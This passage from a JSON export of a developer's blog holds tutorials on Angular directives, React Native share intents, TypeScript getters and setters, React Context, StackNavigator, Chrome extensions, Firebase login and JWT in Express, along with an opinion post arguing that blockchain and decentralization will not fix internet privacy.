(this.specialKeys.indexOf(event.key) !== -1) {\n return;\n }\n let current: string = this.el.nativeElement.value;\n let next: string = current.concat(event.key);\n if (next && !String(next).match(this.regex)) {\n event.preventDefault();\n }\n }\n}/pre\n\nNotice the regular expression used:\n\npreRegExp = new RegExp(/^-?[0-9]+(\\.[0-9]*){0,1}$/g);/pre\n\nThis allows positive and negative decimal values to be entered.\n\n{{ ad }}\n\n Module\n\nInside of your module, make sure you import the nuumber.directive.ts file and pass it into your module&#8217;s declarations:\n\npreimport { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { Routes, RouterModule } from '@angular/router';\nimport { NumberOnlyDirective } from './number.directive';\nimport { FormsModule } from '@angular/forms';\nimport { NgClass } from '@angular/common';\nimport { appComponent } from './temperature.component';\n\n@NgModule({\n imports: [\n CommonModule,\n FormsModule,\n // HttpModule,\n\n],\n providers: [],\n declarations: [appComponent, NumberOnlyDirective],\n bootstrap:[appComponent]\n})\nexport class appModule { }/pre\n\nHTML\n\nFinally, in your component&8217;s HTML you can utilize the directive like so:\n\npre&lt;input strongmyNumberOnly/strong name=\"min\" placeholder=\"Enter Value\" [(ngModel)]=\"my.minVal\"&gt;/pre\n\nThat&#8217;s all it takes, Angular 4 input numbers only directive.  This should also work for Angular 5.\n\n&nbsp;\n",
        "tags": [
            "angular",
            "directive"
        ]
    },
    {
        "uri": "/react-native-android-receive-data-from-share-intent/",
        "title": "React Native Android App Receive Data from Share Intent",
        "content": "\nThis whole problem started when I was working with an app in React Native. I wanted the app to be able to open when it received data from another app through the &#8220;share with&#8221; intent. For example, if I share an URL through the YouTube app, I wanted my app to be recognized as one of the apps that could handle the URL and open it.\n\nI am going to spoil the fun and tell you that there&#8217;s no easy way to do it straight through javascript with React Native. In order to make it work, you are going to have to modify some of the Android code. It&#8217;s not too hard though.\n\n{{ ad }}\n\nMainActivity.java\n\nThe first thing that you are going to have to do is add the following method to your MainActivity.java file (not your MainApplication.java). This is located in your java source folder once you a href=\"https://github.com/react-community/create-react-native-app/blob/master/EJECTING.md\" target=\"_blank\" rel=\"noopener\"eject /ayour react application.\n\npre@Override\n    protected ReactActivityDelegate createReactActivityDelegate() {\n        return new ReactActivityDelegate(this, getMainComponentName()) {\n            @Nullable\n            @Override\n            protected Bundle getLaunchOptions() {\n                Intent intent = MainActivity.this.getIntent();\n                Bundle bundle = new Bundle();\n                bundle.putString(\"url\", intent.getStringExtra(Intent.EXTRA_TEXT));\n                return bundle;\n            }\n        };\n    }\n/pre\n\nWhat I am doing is getting the MainActivity&8217;s intent and creating a new bundle. Within that bundle, I am putting in the incoming string with the key of &#8220;url&#8221; that I can use to access it later in React Native. What&#8217;s really cool is that this sets up an initial prop that can be accessed within React.\n\nAndroid Manifest\n\nNow add the following inside of your MainActivity tag in your Android Manifest. This allows your app to show up on the list of apps on the share with screen whenever text is going to be shared.\n\npre&lt;intent-filter&gt;\n&lt;action android:name=\"android.intent.action.SEND\" /&gt;\n&lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n&lt;data android:mimeType=\"text/*\" /&gt;\n&lt;/intent-filter&gt;/pre\n\nFor more information, you can check out the a href=\"https://developer.android.com/training/sharing/receive.html\" target=\"_blank\" rel=\"noopener\"Android Developer Guide/a.\n\n Accessing in React\n\nFinally, to get access to the URL string we can just use the following in the render function: Text{this.props.url}/Text. This should print out the URL that the application was launched with.\n\n&nbsp;\n",
        "tags": [
            "android",
            "intent",
            "react native"
        ]
    },
    {
        "uri": "/typescript-getter-setter/",
        "title": "Typescript Getter and Setter",
        "content": "This is something that you probably don&#8217;t ever think about, but getters and setters are implicit on every javascript object. For example, if we take the following:\n\npreperson = {};\n\nperson.name = 'Dave' //uses the implicit setter on the object\n\nconsole.log(person.name) //uses the implicit getter/pre\n\nThe above code is something that you have probably have seen very often in javascript. However, this doesn&#8217;t give you much control over how properties are accessed or defined. Suppose you wanted the name to be at least 10 characters long or you wanted to perform some other transformation on the string?\n\nEnter the magic of a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/get\" target=\"_blank\" rel=\"noopener\"getters and setters in Javascript/a. Using a getter and setter, you can define what happens when a particular property is accessed or defined. Since I&#8217;m a huge fan of typescript, let&#8217;s take a look at how to use typescript getter and setter.\n\npreexport class Player {\n    private _name: string;\n    private _gamesWon: number;\n    private _id: string;\n    private _active: boolean;\n\n    constructor(name: string, id: string){\n        this._name = name;\n        this._gamesWon = 0;\n        this._id = id;\n        this._active = false;\n    }\n\n    public get active(): boolean {\n        return this._active;\n    }\n\n    public set active(value: boolean){\n        this._active = value;\n    }\n\n    public get playerName():string {\n        return this._name;\n    }\n\n    public get playerID(): string {\n        return this._id;\n    }\n\n    public get wins(): number {\n        return this._gamesWon;\n    }\n}\n/pre\n\n{{ ad }}\n\nAbove, I list a class called Person. Within the class, I define get and set identifiers. In this particular case, it&#8217;s quite boring as I am not actually doing anything with them. None the less, that&#8217;s a simple class which demonstrates their use case. One important thing to remember is that when you define a get you need to have a corresponding set or the property will be assumed to be read-only. Also, using get and set will bind to the object&#8217;s property. So here&#8217;s how you would use it:\n\nprelet p = new Player('Dave','uid');\np.playerName = 'Now a new name';\nconsole.log(p.playerName);/pre\n\nThere you have it!\n",
        "tags": [
            "getter and setter",
            "typescript"
        ]
    },
    {
        "uri": "/react-context-api/",
        "title": "React Context API",
        "content": "\nI&#8217;m sure you have probably heard of the fancy new React Context API. It&#8217;s a new way for you to manage application state. If you are building a large react application, you have probably encountered a problem where you needed to access and share data across multiple components. For example, we might have information on the currently authenticated user that multiple components need information on. To solve this issue, you might use a library like Redux or Mobx. Well, React&#8217;s new context API is another solution to this problem.\n\nIt&#8217;s worth mentioning that react&#8217;s context API is still in very early stages and subject to change. In fact, the React team heavily warns you against using this for any serious project because of how unstable it can be. Nevermind the warning; let&#8217;s be adventurous and use this cool new feature.\n\nCreating the Context\n\nLet&8217;s first create a global context that we can use multiple components. Create a file called* Context.js* (I placed it in a folder called config) and insert the following:\n\npreimport React from \"react\";\nconst AppContext = React.createContext();\nexport default AppContext;/pre\n\nThe createContext() function performs the magic that we are looking for. It returns to us a context that we can provide and consume data from. Keep in mind, if you call create context from another component, it will return to you an entirely new context.\n\n{{ ad }}\n\nCreating the Context Wrapper\n\nNow that you have the context, you need to wrap it in a provider. Create a component called ContextProvider.js. Thie purpose of this component is to store the data that we want to have access to throughout the entire application. For this tutorial, I am going to make a REST call that will grab data from the JSON placeholder API. This data will be an array of blog posts. I will then provide this data to the context provider so that it can be used through other components.\n\npreimport React, { Component, createContext } from \"react\";\nimport Context from '../config/Context';\n\nclass ContextProvider extends Component {\n  constructor() {\n    super();\n    this.state = {\n      items: []\n    };\n  }\n\n  getDataFromAPI() {\n    fetch(\"https://jsonplaceholder.typicode.com/posts/\")\n      .then(response =&gt; response.json())\n      .then(json =&gt; this.setState({items: json}))\n  }\n\n  componentWillMount() {\n    this.getDataFromAPI();\n  }\n\n  render() {\n    return (\n        &lt;Context.Provider value={{posts: this.state.items}}&gt;\n        {this.props.children}\n       &lt;/Context.Provider&gt;\n    );\n  }\n}\n\nexport default ContextProvider;\n\n/pre\n\nThe import thing to note is the user of the context.provider. I imported the context object we created earlier and called its provider property. For the value, I am passing in an object with a property named posts. This posts property contains the posts from the state. Finally, you must always call the line {this.props.children}\n\n{{ ad }}\n\nEasy right? Now that you have your provider configured, all you need to do is consume the data.\n\n Consuming the Data\n\nYou can consume the data in any component that you want. I am going to consume the data in my App.js component. Consuming the data just means that you are accessing the data that you sent to the provider.\n\npreimport React, { Component } from \"react\";\nimport \"./App.css\";\nimport ContextProvider from './providers/ContextProvider';\nimport Context from './config/Context';\n\nclass App extends Component {\n\nrender() {\nreturn (\n&lt;div&gt;\n&lt;h1&gt;Data we consumed&lt;/h1&gt;\n&lt;hr/&gt;\n&lt;ContextProvider&gt;\n&lt;Context.Consumer&gt;\n{val =&gt;&lt;div&gt;{val.posts.map(p=&gt;&lt;div&gt;&lt;h5&gt;{p.title}&lt;/h5&gt;&lt;br/&gt;&lt;/div&gt;)}&lt;/div&gt;}\n&lt;/Context.Consumer&gt;\n&lt;/ContextProvider&gt;\n&lt;/div&gt;\n);\n}\n}\n\nexport default App;/pre\n\npre/pre\n\nAgain I imported the context that we created earlier. Instead of calling provider, I called consumer. Now I get access to a variable which I called val. This contains all the data that I passed in through the provider. With that variable, I can do anything I want with it. In this case, I just displayed the blog title of each posts.\n\n&nbsp;\n\nFull code on GitHub\n\n&nbsp;\n\n&nbsp;\n",
        "tags": [
            "api",
            "context",
            "react"
        ]
    },
    {
        "uri": "/google-poly-api-javascript-and-nodejs/",
        "title": "Google Poly API Javascript and NodeJS",
        "content": "\nGoogle has been working on an interesting project called Poly. With Poly, you have access to hundreds of 3D objects that can be used to a href=\"https://www.youtube.com/watch?v=IQqmuEVDo6k\" target=\"_blank\" rel=\"noopener\"build VR games/a or with AR content. The interesting about Poly is that all of the graphics are available on demand. Think of it like Google Fonts just for 3D objects. So let&#8217;s take a look at how you can get started with Google Poly API Javascript and NodeJS bundle.\n\nAPI Console\n\nTo use Google Poly, you will first need to enable the API in the a href=\"https://console.developers.google.com/apis/library?project=dazzling-skill-155019\" target=\"_blank\" rel=\"noopener\"Google API project console/a.\n\n Express\n\nGoogle Poly API requires that you serve your content through a web server. So let&#8217;s spin up a simple NodeJS server:\n\npreconst express = require('express')\nconst app = express()\n\napp.use(express.static('public'))\n\napp.listen(3000, () =&gt; console.log('Serving!'))/pre\n\nNotice that we are serving files in a folder called static. Where are you going to get those files? You can a href=\"https://github.com/googlevr/poly-sample-web/archive/master.zip\" target=\"_blank\" rel=\"noopener\"download the Google Poly API demo project here/a. Rename the basic-sample.html **to **index.html and move the whole demo project to  your public folder.\n\n{{ ad }}\n\nChange Some Stuff\n\nIt&8217;s important that you change your API key inside of the index.html file (line 108). Also, if you want to grab another object from a href=\"https://poly.google.com/\" target=\"_blank\" rel=\"noopener\"Poly/a, you can find the object id in the URL and send it to your loadAsset function (line 170). Once you run your webserver, you should get a simple 3D scene. It takes a few moments for the 3D object to download from Poly, so be patient.\n\n[1]: http://localhost/wordpress/wp-content/uploads/2018/03/api-prject-console.png\n",
        "tags": [
            "poly",
            "vr",
            "javascript"
        ]
    },
    {
        "uri": "/react-native-stacknavigator-tutorial/",
        "title": "React Native StackNavigator Tutorial",
        "content": "\nI have spent hours trying to figure out how to actually use the React Native Stacknavigator to navigate between screens. All the tutorials and guides seem to be missing important information, and the official React Native documentation is truly lacking in substance. So I want to save you some headache and give you a quick and easy setup to using the React Native StackNavigator.\n\nYou need to Eject\n\nIf you created your react-native project using the command:\n\nprereact-native init projectName/pre\n\nThen you can skip this step. However, if you use the command:\n\nprecreate-react-native-app/pre\n\nThen you will need to eject your app. I could not find a way to use the Stacknavigator without ejecting my app. To eject your app run the following command:\n\nprenpm run eject/pre\n\nOnce you do that, you should have an index.android.js file and a separate index.ios.js file.\n\n{{ ad }}\n\n Importing App\n\nClear the contents in your index.ios.js and index.android.js file. Then add the following line at the top of both files:\n\npreimport App from './App';/pre\n\nNow in your App.js file import the StackNavigator:\n\npreimport { StackNavigator } from 'react-navigation';/pre\n\nNext, right underneath the line that reads export default class, initialize your StackNavigator:\n\nprestatic navigationOptions = {\ntitle: 'Stories for Reddit',\nheaderStyle: {\nbackgroundColor: '#212121',\n},\nheaderTitleStyle: {\ncolor: '#fff'\n}\n};/pre\n\nIn this case, I also added additional props for the headerTitle and headerStyle. The StackNavigation can be used on every screen that you plan using. Therefore, I will also copy the above lines to any other class that I plan to use as a screen. Within each class, I can change the title to whatever I want the screen to be.\n\nAdding StackNavigator\n\nAt the very bottom of App.js add the stackNavigator:\n\npreconst stories= StackNavigator({\nHome: { screen: App },\nViewer: { screen: Viewer },\n});/pre\n\nI initialized the StackNavigator with the name stories. Then I supplied two screens, one called home and the other called viewer. These names are arbitrary and could be changed to whatever I want. However, the actual screen property needs to refer to the class you want to use. So with the home screen, I want to use my default App.js class. With the viewer screen, I am using another class called Viewer. Remember, you need to import these classes like you would with any other component. Unlike the stackNavigationOptions, this only needs to exist in your App.js file and nowhere else.\n\n{{ ad }}\n\n App Registry\n\nAt the bottom of App.js (after you declared the StackNavigator)  make sure that you have the following line:\n\npreAppRegistry.registerComponent('myAp', () =&gt; stories);/pre\n\nIn the register component, the first parameter should match your App&#8217;s package name, and the callback function variable (\\_stories _in this case) needs to match your stacknavigator name.\n\nUsing StackNavigator\n\nTo actually navigate to another screen, here&8217;s the code that I used:\n\nprerender()\n\n const { navigate } = this.props.navigation;\n\nreturn(\n\n&lt;FlatList\ndata={this.state.data}\nkeyExtractor={item =&gt; item.title}\nrenderItem={({ item }) =&gt; &lt;TouchableOpacity onPress={() =&gt; strongnavigate('Viewer', { stories: item.items })}/strong&gt;&lt;Story title={item.title} profile={item.profile} /&gt;&lt;/TouchableOpacity &gt;}\n/&gt;\n\n)/pre\n\nIn this example, I used a FlatList to navigate to another screen when you press on an item in the list. I also passed additional props to that screen. No matter how you implement it, make sure that you declare the following line inside your render but before your return:\n\npreconst { navigate } = this.props.navigation;/pre\n\nThen in your component&#8217;s onPress function put that following:\n\nprenavigate('Viewer')/pre\n\nThis needs to be repeated on every screen that you want to navigate from and not just your App.js screen.\n\nThat&#8217;s it, now you have all the information you need to navigate react native like a pro!\n\n&nbsp;\n",
        "tags": [
            "navigation",
            "react",
            "react native"
        ]
    },
    {
        "uri": "/blockchain-and-decentralization-will-not-fix-the-internet/",
        "title": "Blockchain and Decentralization will NOT fix the Internet",
        "content": "Stop saying that blockchain and decentralizing everything will fix the Internet. There has been a lot of news around Cambridge Analytica abusing Facebook profile data, and Facebook for a href=\"https://arstechnica.com/information-technology/2018/03/facebook-scraped-call-text-message-data-for-years-from-android-phones/\" target=\"_blank\" rel=\"noopener\"mining user data/a without explicit permission. Yes, I agree that these are very bad things that need to be addressed. And I also agree that while Facebook is at the front-lines of this digital privacy war, we could also blame many other companies like Google, Twitter, Amazon, etc for similar practices. What I don&#8217;t agree with, is the naive dream that decentralization is the next step in fixing these issues.\n\nThere&8217;s no Money in Web 3.0 and Decentralization\n\nThere are many articles claiming a href=\"https://medium.com/@matteozago/why-the-web-3-0-matters-and-you-should-know-about-it-a5851d63c949\" target=\"_blank\" rel=\"noopener\"Web 3.0/a to be the next evolution of the internet.  In the blissful vision of Web 3.0, there will be no single point of control, end users will have complete ownership of their data, high interoperability (applications will be agnostic of the particular service you are using), fewer data breaches and blockchain everywhere.\n\nOn paper, this sounds like a nerd&#8217;s wet dream. But let&#8217;s take a second and really think about this. Why would a company want to move to a system where they don&#8217;t have full control? Why would they want their users to be able to use services outside of their own? Sure, if I am Facebook it would be great to have the ability for Messenger users and Whatsapp users to communicate with each other because I own both and therefore I could harvest even more data from both of the services. It wouldn&#8217;t make sense for me to want to have Telegram users be able to communicate with my Messenger users because I can&#8217;t harvest data from Telegram users (with consent). And my bottom line involves selling data.\n\n{{ ad }}\n\nI often hear people shouting &#8220;But EMAIL! EMAIL&#8221; as an example of the high interoperability. Well, let&#8217;s not downplay the market share Google and Microsoft have when it comes to the email market. Also the fact that most email will go to another user&#8217;s spam folder unless the provider is configured correctly and is reputable. By that regards, Google and Microsoft could (in theory) be the gatekeepers to how email is to be sent and received because they control the numbers.\n\nThe problem I am really trying to highlight is that building a decentralized ecosystem that is platform agnostic is against the desires of many companies. Look at Apple, they are known for their &#8220;golden wall&#8221; of the Apple ecosystem. If they really wanted to, they could be more decentralized and open to multiple outside services, but there is no monetary incentive to do so.\n\nSorry, but my Grandma doesn&8217;t care about PGP Encryption\n\nI really feel like we are missing the point when we start stalking about blockchain, decentralization, dapps, etc. Yes, this technology is cool, but it&#8217;s not what most people care about. Facebook did not become popular because it introduced some crazy new technology to people. It became popular because it was easy enough that you don&#8217;t need to have a computer science degree to understand how to use it.\n\nLiterally, I look at all of these open source applications that nerds rave about. &#8220;Eww&#8230;you use [this mainstream product or service]&#8230;you should really be using &#8230;[insert obscure product or service].&#8221;\n\n{{ ad }}\n\nWhat people need to understand is that until these tools and services are easy to use and look pretty, they are never going to gain mass appeal. Therefore, we are going to be stuck with the same centralized approach that we have.\n\nOkay Smartass, so what&8217;s the solution?\n\nSo you&#8217;re probably thinking, wow this guy is a mood killer. No! I do agree that there is an issue that needs to be addressed concerning privacy and data security. However, I think the solution is simple. Force companies to provide clear and concise privacy statements.\n\nPrivacy Statements\n\nI am very hesitant to suggest legislation as a solution to any technological problem. However, I do believe that the problems concerning privacy and data ownership could be addressed with things like the GDPR. I am skeptical on how these things will be enforced and whether it would just end up hurting smaller startups. But, I according to Pew Research, many people don&8217;t trust these online companies like Facebook and others simply because a href=\"http://www.pewresearch.org/fact-tank/the-state-of-privacy-in-america/\" target=\"_blank\" rel=\"noopener\"they don&#8217;t understand their privacy terms/a. One could optimistically hope that if we made privacy terms to be unambiguous and allowed users to opt-out, then we can tackle this issue from a different perspective.\n\nNow excuse me as I go and update my Twitter with my whereabouts for the entire day and provide hashtags for all my moods.\n\n&nbsp;\n\nSources:\n\na href=\"http://www.pewresearch.org/fact-tank/the-state-of-privacy-in-america/\" target=\"_blank\" rel=\"noopener\"http://www.pewresearch.org/fact-tank/the-state-of-privacy-in-america//a\n\na href=\"https://arstechnica.com/information-technology/2018/03/facebook-scraped-call-text-message-data-for-years-from-android-phones/\" target=\"_blank\" rel=\"noopener\"https://arstechnica.com/information-technology/2018/03/facebook-scraped-call-text-message-data-for-years-from-android-phones//a\n\na href=\"https://medium.com/@matteozago/why-the-web-3-0-matters-and-you-should-know-about-it-a5851d63c949\" target=\"_blank\" rel=\"noopener\"https://medium.com/@matteozago/why-the-web-3-0-matters-and-you-should-know-about-it-a5851d63c949/a\n",
        "tags": [
            "blockchain",
            "decentralization",
            "discussion",
            "rant"
        ]
    },
    {
        "uri": "/how-to-build-a-chrome-extension/",
        "title": "How to build a Chrome Extension",
        "content": "\nChrome extensions are really cool. They allow the user to extend the capabilities of their browser and can incorporate really well into existing apps. So let&#8217;s take a look at how to build a Chrome Extension in less than 10 minutes. Chrome Extensions are written in Javascript, so I recommend that you have a basic understanding of Javascript before proceeding with this tutorial.\n\nWhat we&8217;re building\n\nWe are going to build a simple chrome extension that will allow you to search google for any text that you highlight on a page.\n\nManifest\n\nThe first thing that you need to do is create a file call manifest.json. At the very minimum, every Chrome extension requires a manifest file. This file will tell Chrome the basic information of your app, including its name, version, and required permissions.\n\n{{ ad }}\n\nThere are two types of applications you can build. Event pages or Content Scripts. Event pages are the extensions which are allowed to run in the background and are useful regardless of which page you are on. Content Scripts have limited access to the Chrome APIs but direct access to the web page you are viewing. You would want to use this for an extension that only makes sense for a particular website.\n\nBelow is my Manifest.json\n\npre{\n    \"name\": \"Getting Started Example\",\n    \"version\": \"1.1\",\n    \"description\": \"Build an Extension!\",\n    \"manifest_version\": 2,\n    \"background\": {\n        \"scripts\": [\"background.js\"],\n        \"persistent\": false\n      },\n      \"browser_action\": {\n        \"default_popup\": \"main.html\"\n       },\n       \"permissions\": [\n        \"contextMenus\"\n       ]\n    \n}\n/pre\n\nA couple of things to point out:\n\n Background\\\\*\\\\*\n\nBecause we are creating an extension that runs in the background, we are declaring the files we will need. In this case, we have one script which we will call background.js. We are setting persistent to false because we do not need it to be running constantly, only when the action is launched by the user. This allows any memory allocated by our extension to be freed once it&#8217;s done its task.\n\nBrowser Action\n\nSo you know that small window that appears when you click a Chrome extension? That is a browser action. Think of the browser action as creating the UI elements which the user sees. We are using the deafult_popup **property to specify an HTML file to display when the user clicks the icon. Further, we can customize the app icon and title using the a href=\"https://developer.chrome.com/extensions/browserAction\" target=\"_blank\" rel=\"noopener\"browser action/a. Keep in mind that **this is not a required property. So you don&8217;t need to have any type of HTML or UI for your extension.\n\nPermissions\n\nThese are the permissions that you are requesting from the user. This will change depending on the context of your application. For this application, we are going to be adding something to the context menu.\n\n{{ ad }}\n\n Background.js\n\nOkay, let&#8217;s get to the actual meat of our application. Here are the contents of my background.js\n\nprefunction search(info,tab) {\n    chrome.tabs.create({  \n      url: \"http://www.google.com/search?q=\" + info.selectionText,\n    });           \n  }\n  \n  chrome.contextMenus.create({\n    title: \"Give me something good\", \n    id: \"some-command\",\n    contexts:[\"selection\"], \n  });\n\n  chrome.contextMenus.onClicked.addListener(search);\n/pre\n\nThis is pretty self-explanatory. We are creating a context menu item with the title Give me something good. We have to specify some arbitrary value for the id. For the context, we are handling the selection (text selected). You can also handle a href=\"https://developer.chrome.com/apps/contextMenus\" target=\"_blank\" rel=\"noopener\"different contexts/a like image links.\n\nFinally, we add an onClick listener that triggers the search function. Within that function, we create a new tab to Google search the text that was selected.\n\nDefault_Popup\n\nSo we really didn&8217;t need to add this, but let&#8217;s do it anyway. I created a simple HTML file with the displays a simple message. Again, this is not necessary.\n\nLoading the Extension into Chrome\n\nTo load your extension into Chrome, go to _chrome://extensions/ _in the address bar. Make sure developer mode is selected then go to load unpacked extension. From there you can select the folder with your extension. Then it will be loaded.\n\nWhen you highlight some text, you should not get an option to &8220;Show me something good.&#8221;\n\na href=\"https://github.com/DaveBben/simple-chrome-extension\" target=\"_blank\" rel=\"noopener\"You can view the code on GitHub/a\n\n&nbsp;\n\n[1]: http://localhost/wordpress/wp-content/uploads/2018/03/extensions.png\n",
        "tags": [
            "chrome",
            "extension",
            "javascript"
        ]
    },
    {
        "uri": "/react-login-with-google-firebase/",
        "title": "React Login with Google Firebase",
        "content": "\nThere are many opinionated solutions for building a React Login with Google Firebase. I generally prefer an approach where the user isn&#8217;t shown the main UI until he is logged in. And if the user logs out, we immediately kick him back to the login screen. Luckily, this isn&#8217;t hard to do at all.\n\nDependencies\n\nThe only dependency you will need is the Firebase API. You can install this form the Node Package Manager. I&8217;m also going to be using Bootstrap for this project, but that&#8217;s just a stylistic choice that isn&#8217;t relevant to this tutorial.\n\nprenpm install --save firebase/pre\n\nCreate a Firebase Config File\n\nFirst, make sure that you created a new project using the a href=\"https://console.firebase.google.com/\" target=\"_blank\" rel=\"noopener\"Firebase Dashboard/a. When you set up your project, it will provide you with a Javascript config that you can paste in your HTML.\n\nIn your React project, create a folder underneath source called config. Inside of that folder, create a file called Fire.js. We are going to post the contents in that file and export it.\n\n Fire.js\n\npreimport firebase from 'firebase';\n\nconst config = { /* COPY THE ACTUAL CONFIG FROM FIREBASE CONSOLE */\n  apiKey: 'AIzaSyD_PxFjzcPKX50pq3ITq6Q69fuHvCowMtE',\n  authDomain: 'visual-studio-sync.firebaseapp.com',\n  databaseURL: 'https://visual-studio-sync.firebaseio.com',\n  projectId: 'visual-studio-sync',\n  storageBucket: 'visual-studio-sync.appspot.com',\n  messagingSenderId: '691628632398'\n};\nconst fire = firebase.initializeApp(config);\nexport default fire;\n/pre\n\nWe will import this object whenever we need to use the Firebase API.\n\n{{ ad }}\n\nSetting Up Login\n\nNow it&8217;s time we begin setting up the Login. We are going to use Firebase Auth listener to detect any potential logins. If the login was successful, auth listener will return us a user which we can save to state and write to local storage (optional). If the user logs out, we clear the state and route them back to Login.\n\nApp.js\n\npreimport React, { Component } from 'react';\nimport './App.css';\nimport fire from './config/Fire';\nimport Home from './Home';\nimport Login from './Login';\n\nclass App extends Component {\n  constructor() {\n    super();\n    this.state = ({\n      user: null,\n    });\n    this.authListener = this.authListener.bind(this);\n  }\n\n  componentDidMount() {\n    this.authListener();\n  }\n\n  authListener() {\n    fire.auth().onAuthStateChanged((user) =&gt; {\n      console.log(user);\n      if (user) {\n        this.setState({ user });\n        localStorage.setItem('user', user.uid);\n      } else {\n        this.setState({ user: null });\n        localStorage.removeItem('user');\n      }\n    });\n  }\n  render() {\n    return (\n     &lt;div&gt;{this.state.user ? : ( &lt;Home/&gt;) : (&lt;Login /&gt;)}&lt;/div&gt;\n}\n}\n\n export default App;\n\n/pre\n\nPay attention to the _authListener() _function. This function is being called on componentDidMount. It&8217;s listening to any sign our signout changes. If the user signs in, we are saving it to the state and writing the UID to local storage. Then we are using conditional rendering to the check if the component&#8217;s state.user property is defined. If it is, we are showing home. If it&#8217;s not, we are showing Login.\n\nLogin.js\n\nHere is out Login component:\n\npreimport React, { Component } from 'react';\nimport { Link } from 'react-router-dom';\nimport fire from './config/Fire';\n\nclass Login extends Component {\n  constructor(props) {\n    super(props);\n    this.login = this.login.bind(this);\n    this.handleChange = this.handleChange.bind(this);\n    this.signup = this.signup.bind(this);\n    this.state = {\n      email: '',\n      password: ''\n    };\n  }\n\n  handleChange(e) {\n    this.setState({ [e.target.name]: e.target.value });\n  }\n\n  login(e) {\n    e.preventDefault();\n    fire.auth().signInWithEmailAndPassword(this.state.email, this.state.password).then((u)=&gt;{\n    }).catch((error) =&gt; {\n        console.log(error);\n      });\n  }\n\n  signup(e){\n    e.preventDefault();\n    fire.auth().createUserWithEmailAndPassword(this.state.email, this.state.password).then((u)=&gt;{\n    }).then((u)=&gt;{console.log(u)})\n    .catch((error) =&gt; {\n        console.log(error);\n      })\n  }\n  render() {\n    return (\n       &lt;div className=\"col-md-6\"&gt;\n       &lt;form&gt;\n      &lt;div class=\"form-group\"&gt;\n       &lt;label for=\"exampleInputEmail1\"&gt;Email address&lt;/label&gt;\n       &lt;input value={this.state.email} onChange={this.handleChange} type=\"email\" name=\"email\" class=\"form-control\" id=\"exampleInputEmail1\" aria-describedby=\"emailHelp\" placeholder=\"Enter email\" /&gt;\n       &lt;small id=\"emailHelp\" class=\"form-text text-muted\"&gt;We'll never share your email with anyone else.&lt;/small&gt;\n      &lt;/div&gt;\n       &lt;div class=\"form-group\"&gt;\n      &lt;label for=\"exampleInputPassword1\"&gt;Password&lt;/label&gt;\n      &lt;input value={this.state.password} onChange={this.handleChange} type=\"password\" name=\"password\" class=\"form-control\" id=\"exampleInputPassword1\" placeholder=\"Password\" /&gt;\n      &lt;/div&gt;\n      &lt;button type=\"submit\" onClick={this.login} class=\"btn btn-primary\"&gt;Login&lt;/button&gt;\n      &lt;button onClick={this.signup} style={{marginLeft: '25px'}} className=\"btn btn-success\"&gt;Signup&lt;/button&gt;\n &lt;/form&gt;\n \n &lt;/div&gt;\n    );\n  }\n}\nexport default Login;\n\n/pre\n\nThe only thing to pay attention to is the login() and signup() function. In the login function, we call Firebases&8217; signInWIthEmailAndPassword() function and pass in the email and password.  Notice that this function is a promise. We don&#8217;t really need anything in the then() because our authListener defined in App.js will immediately route the user to Home if the login was successful.\n\n{{ ad }}\n\nThe signup() function create the user with the specified email and password. After creation, the user will be automatically logged in. So the Auth listener in App.js will redirect them to Home.\n\nHome.js\n\nThis one is simple. We simply have a button that will log the user out. Again, the auth listener will detect the change and route the user back to Login.\n\npreimport React, { Component } from 'react';\nimport fire from './config/Fire';\n\nclass Home extends Component {\n    constructor(props) {\n        super(props);\n        this.logout = this.logout.bind(this);\n    }\n\n    logout() {\n        fire.auth().signOut();\n    }\n\n    render() {\n        return (/pre\n\ndiv\n  div\n                div\n  /div\n  \n  div\n                    h1Welcome to Home/h1\n  /div\n  \n  div\n                   buttononClick={this.logout}Logout/button\n  /div\n  \n  div\n                /div\n  /div\n/div\n\npre);\n\n    }\n\n}\n\nexport default Home;\n\n/pre\n\nYour firebase console will show users who signup and when they last logged in:\n\nThat&8217;s it. Like I mentioned, Firebase and React work will together and setting up a React Login with Firebase can save you tons of time over dealing with authentication issues.\n\na href=\"https://github.com/DaveBben/react-firebase\" target=\"_blank\" rel=\"noopener\"You can view the full code on GitHub/a\n\n[1]: http://localhost/wordpress/wp-content/uploads/2018/04/firebase-react-web-setup.png\n[2]: http://localhost/wordpress/wp-content/uploads/2018/04/Firebase-Users.png\n",
        "tags": [
            "auth",
            "firebase",
            "react"
        ]
    },
    {
        "uri": "/jwt-tokens-in-express-and-nodejs/",
        "title": "JWT Tokens in Express and NodeJS",
        "content": "\nThe JSON Web Token (JWT) is the easiest standard for protecting APIs and passing in claims data. A JSON Web token allows the server to verify the authenticity of the user and provide them access to protected API routes and data.&nbsp; A simple JWT flow goes as follows:\n\nThe user sends login credentials to the server\nThe server verifies user against&nbsp;the database then returns a JWT token if valid\nThe user sends that token in the header with every request to API.\nIf JWT token is valid (untampered) and not expired, server processes request. Otherwise, the user must sign in to obtain new JWT.\n\nA JWT is just an encoded string that could look something like this:\n\npreeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o/pre\n\nRemember, this string is encoded and not encrypted!&nbsp;JSON Web Tokens are not meant to be a means for hiding data. The server simplify verifies the decoded string with the secret (stored on the server) to see if it has been tampered with.\n\nLet&#8217;s take a look at how to&nbsp;implement JWT Tokens in Express and NodeJS.\n\nBasic Express Application\n\nHere is a basic express application with two routes: Login, Home. We are using a hard-coded user for this demo instead of an actual database. The server will check to see if the user&8217;s email and password match the hard-coded value. If it does, we return to them &#8220;a token&#8221;. If not, we send a 400 response.\n\nprecode class=\"lang-javascript\"\n\nconst express = require('express')\nvar bodyParser = require('body-parser')\nconst app = express()\n\nconst user = { email: 'demo@gmail.com', password: 1234 }\n\napp.use(bodyParser.urlencoded({ extended: false }));\n\napp.get('/home', (req, res) =&gt; {\n    res.send('Congratulations, you made it to home');\n})\n\napp.post('/login', (req, res) =&gt; {\n    if (req.body.email == user.email && req.body.password == user.password) {\n           res.send('a token');\n        }else{\n            res.sendStatus(400);\n        }\n})\n\napp.listen(8090, () =&gt; console.log('Example app listening on port 8090!'))\n\n/code\n/pre\n\nSo this is fine, but now we want to make the home route protected so that only valid users who are logged in are able to access it. This is where the JWT will come in handy. Instead of returning &#8216;a 